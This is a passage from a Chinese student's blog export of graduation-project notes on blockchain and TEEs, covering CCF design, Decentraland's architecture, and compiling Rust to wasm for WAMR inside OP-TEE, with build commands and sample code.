<strong>CCF的核心设计</strong></h3>\n<ul>\n<li><strong>可信执行环境（TEE）</strong>：CCF依赖于TEE（如Intel\nSGX）来保护应用程序数据和代码的<strong>完整性</strong>和<strong>机密性</strong>。TEE允许在不受信任的主机上安全地执行代码，确保即使主机被攻击，数据和代码也不会泄露。</li>\n<li><strong>简单的编程模型</strong>：CCF提供了一个基于<strong>键值存储</strong>和<strong>可验证日志</strong>的编程模型。开发者可以使用多种编程语言编写智能合约，并通过配置CCF来嵌入不同的语言运行时。</li>\n<li><strong>共识协议</strong>：CCF支持<strong>拜占庭容错（BFT）</strong>和<strong>崩溃容错（CFT）</strong>的共识协议配置。即使某些节点被攻破或密钥泄露，CCF也能通过记录在日志中的恶意活动证据来追责。</li>\n<li><strong>透明的治理</strong>：CCF支持<strong>可编程的治理模型</strong>，联盟成员可以通过投票来管理服务的配置、成员、用户、应用程序代码和治理规则。所有的治理操作都记录在日志中，确保完全的可审计性。</li>\n</ul>\n<h3 id=\"ccf的协议与机制\">3. <strong>CCF的协议与机制</strong></h3>\n<ul>\n<li><strong>节点创建与服务启动</strong>：CCF的节点通过TEE创建，并使用远程认证（remote\nattestation）来证明其运行在受保护的TEE中。服务的启动过程包括生成服务密钥、验证初始配置、启动复制协议等步骤。</li>\n<li><strong>节点的加入与移除</strong>：新节点可以通过加入协议成为服务的一部分，而节点可以通过治理机制被移除。CCF还支持<strong>密钥轮换</strong>和<strong>服务恢复</strong>机制，以应对节点故障或密钥泄露的情况。</li>\n<li><strong>日志加密与可验证性</strong>：CCF使用<strong>Merkle树</strong>来确保日志的完整性，并通过加密机制保护机密数据。每个事务的机密部分使用单独的密钥加密，确保只有授权的客户端可以访问这些数据。</li>\n<li><strong>复制协议</strong>：CCF的复制协议支持<strong>崩溃容错</strong>和<strong>拜占庭容错</strong>配置。协议通过签名和日志记录确保事务的<strong>一致性</strong>和<strong>完整性</strong>，即使部分节点被攻破，系统也能继续安全运行。</li>\n</ul>\n<h1 id=\"区块链的扩展性\">2 区块链的扩展性</h1>\n<blockquote>\n<p>可扩展性增强：解决交易吞吐量和延迟方面的限制，以实现更广泛的采用。最近的研究探索了各种解决方案来提高区块链的可扩展性\nhttps://link.springer.com/article/10.1007/s10586-023-04257-7?utm_source=chatgpt.com</p>\n</blockquote>\n<ul class=\"task-list\">\n<li><label><input type=\"checkbox\">roll-up</label></li>\n<li><label><input type=\"checkbox\">动态负载均衡</label></li>\n<li><label><input type=\"checkbox\">链下交易</label></li>\n<li><label><input type=\"checkbox\">侧链</label></li>\n</ul>\n<p>大数据分布式系统工具：Hadoop、Spark、Kafka</p>\n<ol start=\"7\" type=\"1\">\n<li><p>隐私保护的电子病历交换与共享：基于区块链的智能医疗系统</p></li>\n<li><p>以太坊的可扩展性挑战：初步定量分析</p></li>\n<li><p>Zecale：在以太坊上调和隐私与可扩展性</p></li>\n<li><p><del>比特币价格预测与分析：基于深度学习模型</del></p></li>\n<li><p>使用Rollups扩展区块链：全面综述</p></li>\n<li><p>私有以太坊区块链中基于网络分片的动态负载均衡方案</p></li>\n<li><p>侧链与互操作性</p></li>\n<li><p>区块链、物联网与人工智能的融合</p></li>\n<li><p>无信任机器学习合约：在以太坊区块链上评估与交换机器学习模型</p></li>\n<li><p>Apache Kafka：下一代分布式消息系统</p></li>\n<li><p>Mystiko——区块链与大数据的结合</p></li>\n<li><p>区块链系统中的DAG综述</p></li>\n</ol>\n<h1 id=\"后续\">后续</h1>\n<p>最后的方案就是不管……直接把私钥存在安全世界里。</p>\n<p>其他区块链相关论文也不想看了，不要这个方向了……</p>\n","categories":["笔记"],"tags":["区块链","毕设"]},{"title":"毕设16 - Decentraland","url":"/graduation-project/16/","content":"<p>刚跟老师打完电话，数字身份 + TEE\n也还是太重复了，都做完了ε＝ε＝ε＝(#&gt;д&lt;)ﾉ</p>\n<p>说可以找一个实际背景，他推荐了 Decentraland 和 NVIDIA Omniverse。</p>\n<p>都先看一看吧……区块链到元宇宙……一个比一个偏……</p>\n<span id=\"more\"></span>\n<p>很头疼…… NVIDIA Omniverse\n不是元宇宙世界，而是AI技术，用于即时生成一些物理反馈（刚体运动、光线追踪等）可以用于元宇宙实现更真实的交互。所以数字身份跟他没什么关系。</p>\n<h1 id=\"decentraland-组成部分\">Decentraland 组成部分</h1>\n<h2 id=\"catalyst-网络\">1. <strong>Catalyst 网络</strong></h2>\n<p>Catalyst 是 Decentraland\n的分布式节点网络，提供核心服务，例如内容访问、P2P\n通信、区块链数据查询等。每个 Catalyst 节点包括以下子系统：</p>\n<h3 id=\"content-service内容服务\"><strong>1.1 Content\nService（内容服务）</strong></h3>\n<ul>\n<li>功能：\n<ul>\n<li>提供访问分布式文件系统的接口。</li>\n<li>支持查询内容索引、检索文件、部署实体和下载定期快照。</li>\n</ul></li>\n<li>技术：\n<ul>\n<li>使用 IPFS 或类似的分布式存储技术。</li>\n<li>确保内容的可用性和防篡改性。</li>\n</ul></li>\n<li>应用场景：\n<ul>\n<li>玩家访问场景或资产时，客户端通过 Content Service 加载所需内容。</li>\n</ul></li>\n</ul>\n<h3 id=\"lambda-service\"><strong>1.2 Lambda Service</strong></h3>\n<ul>\n<li>功能：\n<ul>\n<li>提供一组实用的\nAPI，供客户端快速获取常用数据（例如用户配置文件、资产状态）。</li>\n<li>在需要验证资产所有权时，通过 The Graph 查询区块链状态。</li>\n</ul></li>\n<li>特点：\n<ul>\n<li>提供更快的查询响应。</li>\n<li>减轻客户端对区块链直接查询的负担。</li>\n</ul></li>\n</ul>\n<h3 id=\"comms-service通信服务\"><strong>1.3 Comms\nService（通信服务）</strong></h3>\n<ul>\n<li>功能：\n<ul>\n<li>使用 Archipelago\n服务将玩家根据地理位置分组到“动态岛屿”中，优化通信效率。</li>\n<li>提供文本和语音通信的 P2P 通信能力。</li>\n</ul></li>\n<li>技术：\n<ul>\n<li>支持 WebRTC 作为底层传输协议。</li>\n<li>动态平衡岛屿中的用户数量，并根据用户的移动重新分配。</li>\n</ul></li>\n</ul>\n<h3 id=\"backend-for-frontend-servicebff-服务\"><strong>1.4\nBackend-for-Frontend Service（BFF 服务）</strong></h3>\n<ul>\n<li>功能：\n<ul>\n<li>提供适配客户端的后端服务，简化开发和维护。</li>\n<li>管理 P2P 信令，确保通信功能的高效实现。</li>\n</ul></li>\n<li>作用：\n<ul>\n<li>加速新功能开发，同时保持现有 API 的兼容性。</li>\n</ul></li>\n</ul>\n<h2 id=\"world-explorer世界探索器\">2. <strong>World\nExplorer（世界探索器）</strong></h2>\n<p>World Explorer 是 Decentraland\n的客户端应用，允许用户进入虚拟世界并探索场景。其子系统包括：</p>\n<h3 id=\"content-system内容系统\"><strong>2.1 Content\nSystem（内容系统）</strong></h3>\n<ul>\n<li>功能：\n<ul>\n<li>客户端从 Catalyst 网络的 Content Service 下载和缓存内容。</li>\n<li>支持更新玩家的个人资料或其他资产。</li>\n</ul></li>\n<li>特点：\n<ul>\n<li>实现内容的高效加载与更新。</li>\n</ul></li>\n</ul>\n<h3 id=\"game-engine游戏引擎\"><strong>2.2 Game\nEngine（游戏引擎）</strong></h3>\n<ul>\n<li>子系统：\n<ul>\n<li><strong>Rendering System（渲染系统）</strong>：渲染 3D\n场景，生成虚拟世界的视觉效果。</li>\n<li><strong>State\nSystem（状态系统）</strong>：同步场景中实体和组件的状态。</li>\n<li><strong>Input\nSystem（输入系统）</strong>：处理用户输入（如键盘、鼠标、控制器），并将事件分发到订阅的组件。</li>\n</ul></li>\n<li>技术：\n<ul>\n<li>使用 Unity 或自定义引擎处理 3D 渲染和交互。</li>\n</ul></li>\n</ul>\n<h3 id=\"scene-runtime场景运行时\"><strong>2.3 Scene\nRuntime（场景运行时）</strong></h3>\n<ul>\n<li>功能：\n<ul>\n<li>在沙盒环境中运行用户开发的场景。</li>\n<li>提供模块化库，允许访问需要授权的方法。</li>\n</ul></li>\n<li>特点：\n<ul>\n<li>确保场景之间相互隔离，避免安全敏感数据泄露。</li>\n</ul></li>\n</ul>\n<h3 id=\"comms-system通信系统\"><strong>2.4 Comms\nSystem（通信系统）</strong></h3>\n<ul>\n<li>功能：\n<ul>\n<li>提供客户端侧的通信功能，支持文字、语音聊天及玩家之间的消息交换。</li>\n<li>连接到 Catalyst 网络中的 Archipelago 服务。</li>\n</ul></li>\n<li>特点：\n<ul>\n<li>支持多种通信协议，提升聊天和交互体验。</li>\n</ul></li>\n</ul>\n<h2 id=\"cli命令行界面\">3. <strong>CLI（命令行界面）</strong></h2>\n<p>CLI 是开发者使用的工具，用于场景开发和部署。</p>\n<ul>\n<li>功能：\n<ul>\n<li>创建项目模板。</li>\n<li>本地运行和可视化场景。</li>\n<li>测试和部署场景到 Catalyst 网络。</li>\n</ul></li>\n<li>特点：\n<ul>\n<li>提供快速开发的便捷工具链。</li>\n<li>集成 IPFS 和区块链的无缝操作。</li>\n</ul></li>\n</ul>\n<h2 id=\"其他关键组件\">4. <strong>其他关键组件</strong></h2>\n<h3 id=\"catalyst-client\"><strong>4.1 Catalyst Client</strong></h3>\n<ul>\n<li>功能：\n<ul>\n<li>用于与 Catalyst 服务交互。</li>\n<li>支持数据查询和实体部署。</li>\n</ul></li>\n</ul>\n<h3 id=\"peer-library\"><strong>4.2 Peer Library</strong></h3>\n<ul>\n<li>功能：\n<ul>\n<li>管理 WebSocket 连接，用于 WebRTC 信令。</li>\n<li>支持实时聊天、玩家位置同步等功能。</li>\n</ul></li>\n</ul>\n<h3 id=\"kernel\"><strong>4.3 Kernel</strong></h3>\n<ul>\n<li>模块：\n<ul>\n<li><strong>Scene Loader\nSystem</strong>：根据玩家位置动态加载和卸载场景。</li>\n<li><strong>Avatar Scene</strong>：处理虚拟角色渲染。</li>\n<li><strong>Voice Chat Module</strong>：通过 WebAudio\n实现高质量语音聊天。</li>\n</ul></li>\n</ul>\n<h3 id=\"synapse-和-livekit\"><strong>4.4 Synapse 和 LiveKit</strong></h3>\n<ul>\n<li><strong>Synapse</strong>：实现基于 Matrix\n协议的去中心化通信，用于私人聊天和好友管理。</li>\n<li><strong>LiveKit</strong>：通过选择性转发单元（SFU）优化实时通信，提升大型场景中的性能和质量。</li>\n</ul>\n<h3 id=\"nats\"><strong>4.5 NATS</strong></h3>\n<ul>\n<li>功能：\n<ul>\n<li>消息代理，用于服务间的通信。</li>\n<li>在通信架构中连接 BFF、Archipelago 和 LiveKit。</li>\n</ul></li>\n</ul>\n<hr>\n<p>Decentraland 的架构通过 <strong>Catalyst 网络</strong>\n提供去中心化服务，<strong>World Explorer</strong> 实现用户体验，并通过\n<strong>CLI</strong>\n支持内容开发者的高效生产。所有组件基于模块化设计，确保性能、扩展性和灵活性。</p>\n<h2 id=\"区块链在其中的地位\">区块链在其中的地位</h2>\n<ol type=\"1\">\n<li><strong>虚拟资产与交易</strong>：Decentraland\n中的资产（LAND、MANA、NFT等）均是以太坊上的加密货币或代币。Decentraland\n中的经济体系、各种交易，都是发送给区块链执行的。</li>\n<li><strong>去中心化治理（DAO）</strong>：去中心化自治组织，这也是很典型的基于区块链的应用。用户通过在区块链上投票，决定平台的发展方向。</li>\n</ol>\n","categories":["笔记"],"tags":["区块链","毕设"]},{"title":"毕设17 - DID数字身份 Rust 实现","url":"/graduation-project/17/","content":"<p>复工复工。这一个月补了区块链的底层原理，过了个年，做了点AI项目。</p>\n<p>总之，少不了在 Cosmos 里实现数字身份的内容，先把这个做了。</p>\n<p>这一步还是得用上 Wasm ……吗？用吧，不用没有能扯的创新点了……</p>\n<p>为什么不直接把数字身份的内容作为 Cosmos 的模块呢？……</p>\n<p>作为模块，代码直接运行在REE中了，必须要让这部分代码跑在TEE里。那能不能核心生成VC，VP的代码跑在TEE里，其他跑在REE里呢？差不多，这就约等于全跑在TEE里了。那既然跑在TEE里了，就写的通用一点，做成智能合约的结构。</p>\n<span id=\"more\"></span>\n<h1 id=\"分析\">0 分析</h1>\n<p>大体上还是之前的结构，有几个地方要大改动：</p>\n<ul>\n<li>不需要冗余的proxy，直接cosmos和host连通。</li>\n<li>信息传输方式格式\n<ul>\n<li>json格式效率低、不安全</li>\n<li>初步打算改用\nMessagePack，天然更小的体积，更快的速度，二进制格式天然对抗注入攻击，支持动态schema</li>\n</ul></li>\n<li>链上状态和智能合约（aot）全部加密，秘钥留在TEE里，有验证和解密程序。</li>\n<li>wasm代码要能够让cosmos提供新的数据。</li>\n<li>重写 TA 和 wasm，全部改用 Rust。</li>\n</ul>\n<p>重点在于：</p>\n<ol type=\"1\">\n<li>rust 编译成 wamr 可以运行的 wasm</li>\n<li>wasm智能合约内部调用获取私钥，解密、加密数据</li>\n<li>wasm智能合约和cosmos进行通信</li>\n</ol>\n<h1 id=\"wamr-rust\">1 WAMR &amp; Rust</h1>\n<blockquote>\n<p>参考资料：https://anoopelias.github.io/posts/wasm-micro-runtime-with-rust/</p>\n</blockquote>\n<p>根据参考资料，按如下步骤准备：</p>\n<p>源代码：</p>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#![no_std]</span></span><br><span class=\"line\"><span class=\"meta\">#![no_main]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> core::panic::PanicInfo;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#[panic_handler]</span></span><br><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">panic</span>(_info: &amp;PanicInfo) <span class=\"punctuation\">-&gt;</span> ! {</span><br><span class=\"line\">    <span class=\"keyword\">loop</span> {}</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"string\">\"C\"</span> {</span><br><span class=\"line\">    <span class=\"keyword\">fn</span> <span class=\"title function_\">puts</span>(s: *<span class=\"keyword\">const</span> <span class=\"type\">i8</span>) <span class=\"punctuation\">-&gt;</span> <span class=\"type\">i32</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#[no_mangle]</span></span><br><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">main</span>() {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">hello</span> = <span class=\"string\">\"Hello Rust World!\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"variable\">hello_ptr</span>: *<span class=\"keyword\">const</span> <span class=\"type\">u8</span> = hello.<span class=\"title function_ invoke__\">as_ptr</span>() <span class=\"keyword\">as</span> *<span class=\"keyword\">const</span> <span class=\"type\">u8</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">unsafe</span> {</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">puts</span>(hello_ptr);</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>编译指令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">rustc -C link-self-contained=no \\</span><br><span class=\"line\">    -C link-args=--no-entry \\</span><br><span class=\"line\">    -C link-args=-zstack-size=32768 \\</span><br><span class=\"line\">    --target wasm32-wasip1 main.rs</span><br></pre></td></tr></table></figure>\n<p>AoT：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">wamrc --target=aarch64 --disable-simd -o main.aot main.wasm</span><br></pre></td></tr></table></figure>\n<p>然后进入 optee 中，用 optee_wamr 运行这个 aot 文件，但是报错：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">failed to call unlinked import function (env, puts)</span><br></pre></td></tr></table></figure>\n<p>是因为之前我实现的 optee_wamr 不支持导入外部函数。</p>\n<p>更新了 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0Npc2hvb24vT1BURUUtV0FNUi90cmVlL21haW4=\">OPTEE-WAMR<i class=\"fa fa-external-link-alt\"></i></span>\n增加了导入外部函数的功能，现在运行会在安全世界里输出：Hello Rust\nWorld!</p>\n<h1 id=\"wasm智能合约访问链上数据\">2 Wasm智能合约访问链上数据</h1>\n<h2 id=\"cgo-回调-go\">2.1 cgo 回调 go</h2>\n<p>需要实现将 go 函数传递给 c 调用。</p>\n<p>一个例子：</p>\n<figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> main</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">// 定义C函数指针类型</span></span><br><span class=\"line\"><span class=\"comment\">typedef void (*Callback)(const char*);</span></span><br><span class=\"line\"><span class=\"comment\">extern void goCallbackProxy(char* msg);</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">// C端触发回调的函数</span></span><br><span class=\"line\"><span class=\"comment\">static void triggerCallback(Callback cb) {</span></span><br><span class=\"line\"><span class=\"comment\">    cb(\"Hello from C!\");</span></span><br><span class=\"line\"><span class=\"comment\">}</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">\"C\"</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> (</span><br><span class=\"line\">\t<span class=\"string\">\"fmt\"</span></span><br><span class=\"line\">\t<span class=\"string\">\"runtime\"</span></span><br><span class=\"line\">)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//export goCallbackProxy</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">goCallbackProxy</span><span class=\"params\">(msg *C.char)</span></span> {</span><br><span class=\"line\">\tfmt.Println(<span class=\"string\">\"Go received:\"</span>, C.GoString(msg))</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> {</span><br><span class=\"line\">\t<span class=\"comment\">// 将Go回调函数转换为C函数指针</span></span><br><span class=\"line\">\tcb := C.Callback(C.goCallbackProxy)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">// 调用C函数触发回调</span></span><br><span class=\"line\">\tC.triggerCallback(cb)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">// 防止cb被提前回收</span></span><br><span class=\"line\">\truntime.KeepAlive(cb)</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<h2 id=\"ta主动触发ca行为\">2.2 TA主动触发CA行为</h2>\n<p>思路为使用共享内存空间作为TA和CA沟通的桥梁。具体实现如下：</p>\n<p>分配一块共享内存空间：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">shared_mem</span></span></span><br><span class=\"line\"><span class=\"class\">{</span></span><br><span class=\"line\">\t<span class=\"type\">char</span> data[<span class=\"number\">256</span>];\t\t<span class=\"comment\">// 数据区域</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> ready; <span class=\"comment\">// 准备标志</span></span><br><span class=\"line\">};</span><br></pre></td></tr></table></figure>\n<p>将 CA 分为两个线程：</p>\n<ol type=\"1\">\n<li>负责调用TA</li>\n<li>负责轮询监听共享内存空间</li>\n</ol>\n<p>TA 需要传递数据给 CA 时：</p>\n<ol type=\"1\">\n<li>将数据写入 data</li>\n<li>修改 ready</li>\n</ol>\n<p>进一步考虑可能存在的问题，进行防御性变成：</p>\n<ol type=\"1\">\n<li>防止编译器优化掉 <code>ready</code> 的读写或重排顺序</li>\n<li>确保编译器生成的代码顺序与源码一致</li>\n</ol>\n<p>最终伪代码为：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 共享内存定义</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> {</span></span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> data[DATA_SIZE];</span><br><span class=\"line\">    <span class=\"keyword\">volatile</span> <span class=\"type\">int</span> ready;</span><br><span class=\"line\">} SharedMem;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// TA侧写入</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> (shared_mem.ready != <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"built_in\">memcpy</span>(shared_mem.data, data, size);</span><br><span class=\"line\">__asm__ __volatile__(<span class=\"string\">\"\"</span> ::: <span class=\"string\">\"memory\"</span>); <span class=\"comment\">// 编译器屏障，防止编译器提前修改ready</span></span><br><span class=\"line\">shared_mem.ready = <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// CA侧读取</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> (shared_mem.ready != <span class=\"number\">1</span>);</span><br><span class=\"line\">process_data(shared_mem.data);</span><br><span class=\"line\">__asm__ __volatile__(<span class=\"string\">\"\"</span> ::: <span class=\"string\">\"memory\"</span>); <span class=\"comment\">// 编译器屏障</span></span><br><span class=\"line\">shared_mem.ready = <span class=\"number\">0</span>;</span><br></pre></td></tr></table></figure>\n<h2 id=\"设计ca-ta交互接口\">2.3 设计CA TA交互接口</h2>\n<p>通过共享内存交换数据发送请求，需要设计请求的接口。</p>\n<p>TA 向 CA 发送请求：</p>\n<ol type=\"1\">\n<li><p>set 状态</p>\n<p><figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">{</span></span><br><span class=\"line\">  <span class=\"attr\">\"type\"</span><span class=\"punctuation\">:</span> <span class=\"string\">\"set\"</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  <span class=\"attr\">\"key\"</span><span class=\"punctuation\">:</span> <span class=\"string\">\"key\"</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  <span class=\"attr\">\"value\"</span><span class=\"punctuation\">:</span> <span class=\"string\">\"value\"</span></span><br><span class=\"line\"><span class=\"punctuation\">}</span></span><br></pre></td></tr></table></figure></p></li>\n<li><p>get 状态</p>\n<p><figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">{</span></span><br><span class=\"line\">  <span class=\"attr\">\"type\"</span><span class=\"punctuation\">:</span> <span class=\"string\">\"get\"</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  <span class=\"attr\">\"key\"</span><span class=\"punctuation\">:</span> <span class=\"string\">\"key\"</span></span><br><span class=\"line\"><span class=\"punctuation\">}</span></span><br></pre></td></tr></table></figure></p></li>\n</ol>\n<p>CA 向 TA 返回数据：</p>\n<ol type=\"1\">\n<li><p>set 返回成功与否</p>\n<p><figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">{</span></span><br><span class=\"line\">  <span class=\"attr\">\"status\"</span><span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">true</span></span></span><br><span class=\"line\"><span class=\"punctuation\">}</span></span><br></pre></td></tr></table></figure></p></li>\n<li><p>get 返回对应的值</p>\n<p><figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">{</span></span><br><span class=\"line\">  <span class=\"attr\">\"status\"</span><span class=\"punctuation\">:</span> <span class=\"literal\"><span class=\"keyword\">true</span></span><span class=\"punctuation\">,</span>  <span class=\"comment\">// 表示整体操作成功</span></span><br><span class=\"line\">  <span class=\"attr\">\"value\"</span><span class=\"punctuation\">:</span> <span class=\"string\">\"value\"</span></span><br><span class=\"line\"><span class=\"punctuation\">}</span></span><br></pre></td></tr></table></figure></p></li>\n</ol>\n<p>原来想采用 MessagePack 序列化数据，但是库里依赖网络接口\n<code>#include &lt;arpa/inet.h&gt;</code> ，过于复杂且 TEE</p>\n<p>环境不支持。另外，我这里序列化的需求很简单，不如自己实现序列化。代码很简单，这里不记录了。</p>\n<h1 id=\"优化智能合约\">3 优化智能合约</h1>\n<h2 id=\"rust-wasm的内存分配\">3.1 Rust-wasm的内存分配</h2>\n<p>遇到第一个问题，纯C中要分配内存直接调用 <code>malloc</code>\n即可，编译出的wasm文件可以直接wamrc预编译。</p>\n<p>但是Rust的内存管理方式不同，需要自定义内存分配器。但是，如果自定义了内存分配器就无法wamrc预编译。</p>\n<p>下面进行一系列测试：</p>\n<h3 id=\"编译指令设置\">3.1.1 编译指令设置</h3>\n<p><code>build-c.sh</code>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/opt/wasi-sdk/bin/clang --target=wasm32-wasi -O3 -nostdlib \\</span><br><span class=\"line\">    -Wl,--no-entry -Wl,--export=test -o test-c.wasm test-c.c</span><br><span class=\"line\"></span><br><span class=\"line\">./wamrc --target=aarch64 --disable-simd -o test-c.aot test-c.wasm</span><br><span class=\"line\"></span><br><span class=\"line\">wasm2wat test-c.wasm &gt; test-c.wat</span><br></pre></td></tr></table></figure>\n<p><code>build-rs.sh</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">rustc -C link-self-contained=no \\</span><br><span class=\"line\">    -C link-args=-zstack-size=32768 \\</span><br><span class=\"line\">    -C link-args=-O3 \\</span><br><span class=\"line\">    -C link-args=--no-entry \\</span><br><span class=\"line\">    --target wasm32-wasip1 test-rs.rs</span><br><span class=\"line\"></span><br><span class=\"line\">./wamrc --target=aarch64 --disable-simd -o test-rs.aot test-rs.wasm</span><br><span class=\"line\"></span><br><span class=\"line\">wasm2wat test-rs.wasm &gt; test-rs.wat</span><br></pre></td></tr></table></figure>\n<h3 id=\"简单加法\">3.1.2 简单加法</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">test</span><span class=\"params\">()</span></span><br><span class=\"line\">{</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span> + <span class=\"number\">2</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#![no_std]</span></span><br><span class=\"line\"><span class=\"meta\">#![no_main]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#[panic_handler]</span></span><br><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">panic</span>(_: &amp;core::panic::PanicInfo) <span class=\"punctuation\">-&gt;</span> ! {</span><br><span class=\"line\">    <span class=\"keyword\">loop</span> {}</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#[no_mangle]</span></span><br><span class=\"line\"><span class=\"keyword\">pub</span> <span class=\"keyword\">fn</span> <span class=\"title function_\">test</span>() <span class=\"punctuation\">-&gt;</span> <span class=\"type\">i32</span> {</span><br><span class=\"line\">    <span class=\"number\">1</span> + <span class=\"number\">2</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>编译结果非常类似：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">(module $test-c.wasm</span><br><span class=\"line\">  (type (;0;) (func (result i32)))</span><br><span class=\"line\">  (func $test (type 0) (result i32)</span><br><span class=\"line\">    i32.const 3)</span><br><span class=\"line\">  (memory (;0;) 2)</span><br><span class=\"line\">  (global $__stack_pointer (mut i32) (i32.const 66560))</span><br><span class=\"line\">  (export \"memory\" (memory 0))</span><br><span class=\"line\">  (export \"test\" (func $test)))</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">(module $test-rs.wasm</span><br><span class=\"line\">  (type (;0;) (func (param i32)))</span><br><span class=\"line\">  (type (;1;) (func (result i32)))</span><br><span class=\"line\">  (type (;2;) (func (param i32 i32)))</span><br><span class=\"line\">  (func $rust_begin_unwind (type 0) (param i32)</span><br><span class=\"line\">    loop  ;; label = @1</span><br><span class=\"line\">      br 0 (;@1;)</span><br><span class=\"line\">    end)</span><br><span class=\"line\">  (func $test (type 1) (result i32)</span><br><span class=\"line\">    (local i32 i32 i32 i32 i32)</span><br><span class=\"line\">    ......//省略</span><br><span class=\"line\">    call $_ZN4core9panicking11panic_const24panic_const_add_overflow17h183f3e35055c840eE</span><br><span class=\"line\">    unreachable)</span><br><span class=\"line\">  (func $_ZN4core9panicking9panic_fmt17hd65c069160825202E (type 2) (param i32 i32)</span><br><span class=\"line\">    ......//省略</span><br><span class=\"line\">    call $rust_begin_unwind</span><br><span class=\"line\">    unreachable)</span><br><span class=\"line\">  (func $_ZN4core9panicking11panic_const24panic_const_add_overflow17h183f3e35055c840eE (type 0) (param i32)</span><br><span class=\"line\">    ......//省略</span><br><span class=\"line\">    call $_ZN4core9panicking9panic_fmt17hd65c069160825202E</span><br><span class=\"line\">    unreachable)</span><br><span class=\"line\">  (table (;0;) 1 1 funcref)</span><br><span class=\"line\">  (memory (;0;) 1)</span><br><span class=\"line\">  (global $__stack_pointer (mut i32) (i32.const 32768))</span><br><span class=\"line\">  (export \"memory\" (memory 0))</span><br><span class=\"line\">  (export \"test\" (func $test))</span><br><span class=\"line\">  (data $.rodata (i32.const 32768) \"test-rs.rs\\00\\00\\00\\80\\00\\00\\0a\\00\\00\\00\\0b\\00\\00\\00\\05\\00\\00\\00attempt to add with overflow\\1c\\80\\00\\00\\1c\\00\\00\\00\"))</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>可以看到 Rust 的编译结果复杂很多，包含了大量的溢出检查（overflow\nchecking）相关代码。</p>\n<p>如果想让 Rust 编译结果和 C 类似，可以如下修改：</p>\n<figure class=\"highlight rust\"><table><tr><td 